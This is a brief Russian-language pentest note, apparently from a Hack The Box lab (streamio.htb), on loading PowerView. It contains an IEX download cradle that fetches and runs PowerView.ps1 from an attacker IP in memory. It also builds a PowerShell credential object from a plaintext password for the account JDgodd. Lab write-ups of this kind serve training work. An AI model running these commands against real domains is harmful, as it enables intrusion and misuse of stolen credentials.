# POWER

https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/

Запустить повер виев

. .\PowerView.ps1

загрузиь повервью в память

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerView.ps1')

Поскольку у нас нет оболочки для JDgodd, мы можем использовать PowerShell.
 System.Management.Automation.PSCredential для хранения учетных данных в нашей текущей оболочке.

 $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd',
$SecPassword)
